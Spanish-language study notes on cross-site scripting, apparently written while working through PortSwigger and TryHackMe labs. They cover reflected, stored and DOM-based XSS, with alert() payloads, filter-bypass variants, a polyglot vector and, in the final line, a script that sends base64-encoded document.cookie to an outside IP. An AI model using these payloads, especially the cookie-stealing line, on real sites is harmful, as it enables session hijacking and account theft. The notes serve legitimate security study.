# XSS

Esta hoja de trucos de secuencias de comandos entre sitios (XSS) contiene muchos vectores que pueden ayudarle a evitar WAF y filtros. Puede seleccionar vectores por evento, etiqueta o navegador y se incluye una prueba de concepto para cada vector.

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet








# XSS reflejado en HTML sin codificación

## Laboratorio: XSS reflejado en contexto HTML sin nada codificado

Este laboratorio contiene una vulnerabilidad simple reflejada de secuencias de comandos entre sitios en la funcionalidad de búsqueda.

To solve the lab, perform a cross-site scripting attack that calls the alert functio


En esta clase damos los primeros pasos en el mundo del Cross-Site Scripting (XSS), concretamente en su variante reflejada. Analizamos una funcionalidad de búsqueda donde el valor introducido por el usuario se refleja directamente en la respuesta HTML de la página, sin ningún tipo de codificación o validación.

Aprovechamos esta falta de protección para inyectar código que se ejecuta en el navegador de la víctima al interactuar con la funcionalidad vulnerable. En este caso, demostramos la ejecución de un fragmento de código que invoca una alerta en pantalla, lo cual confirma que la inyección es posible y activa.

Esta lección marca el inicio de una nueva sección dedicada a la explotación de XSS, explorando cómo los datos del usuario, si no son tratados correctamente, pueden convertirse en vectores de ataque dentro del navegador.


Laboratorio: XSS reflejado en contexto HTML sin nada codificado

Este laboratorio contiene una vulnerabilidad simple reflejada de secuencias de comandos entre sitios en la funcionalidad de búsqueda.



<script>onerror=alert;throw 1</script>

<script>{onerror=alert}throw 1</script>











# XSS almacenado en HTML sin codificación

En esta clase abordamos un XSS almacenado, una variante más peligrosa que el reflejado, ya que el código malicioso no se ejecuta solo al enviar una petición directa, sino que queda guardado en el sistema y se activa cada vez que otro usuario accede al contenido afectado.

La vulnerabilidad se encuentra en la funcionalidad de comentarios de una entrada de blog. El sistema acepta entradas de texto —como nombre, email, sitio web y comentario— sin realizar ninguna codificación, validación o filtrado. Esto permite inyectar código que se guarda en el servidor y se ejecuta automáticamente cuando la página del blog vuelve a ser cargada por cualquier visitante.

En esta clase demostramos cómo insertar un fragmento de código que, al visualizarse en el blog, desencadena una acción en el navegador como mostrar una alerta, confirmando que el entorno es vulnerable.

Este laboratorio sienta las bases para comprender cómo el XSS almacenado puede ser utilizado para comprometer a múltiples usuarios, incluso sin interacción directa entre atacante y víctima.

## Laboratorio: XSS almacenado en contexto HTML sin nada codificado

Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios almacenada en la funcionalidad de comentarios.

Para resolver este laboratorio, envíe un comentario que llame al alert función cuando se visualiza la publicación del blog.


<script>onerror=alert;throw 1</script>









# XSS DOM con ‘document.write’ y ‘location.search’

En esta lección nos adentramos en el XSS basado en DOM, donde la vulnerabilidad no reside en el servidor, sino en cómo el código JavaScript del navegador procesa los datos de la URL.

El laboratorio utiliza una función que escribe directamente en la página el valor obtenido desde la parte de búsqueda de la URL (lo que va después del símbolo de interrogación). Este dato no es validado ni codificado, y se inserta dinámicamente mediante una función que genera HTML de forma directa.

Inicialmente observamos que al hacer una búsqueda cualquiera, el valor se refleja dentro de un atributo de imagen. A partir de ahí, construimos un vector de ataque que rompe el atributo e introduce código que se ejecuta en el navegador de la víctima.

Este tipo de XSS es especialmente común en aplicaciones ricas en JavaScript y demuestra cómo la lógica del lado cliente puede ser tan peligrosa como una mala validación en el backend.

## Laboratorio: DOM XSS en document.write hundir usando la fuente location.search

Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios basada en DOM en la funcionalidad de seguimiento de consultas de búsqueda. Utiliza JavaScript document.write función que escribe datos en la página. El document.write La función se llama con datos de location.search, que puedes controlar utilizando la URL del sitio web.

Para resolver este laboratorio, realice un ataque de secuencias de comandos entre sitios que llame al alert función.



<script> document.write(sanitizeHtml('<iframe onload=alert(1)>'))</script>


"><script>alert('THM')</script>

<script>alert('THM');</script>
</textarea><script>alert('THM');</script>


';alert('THM');//


Original Payload:
<sscriptcript>alert('THM');</sscriptcript>

Text to be removed (by the filter):
<sscriptcript>alert('THM');</sscriptcript>

Final Payload (after passing the filter):
<script>alert('THM');</script>

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e


</textarea><script>fetch('http://10.10.17.68:9001?cookie=' + btoa(document.cookie) );</script>
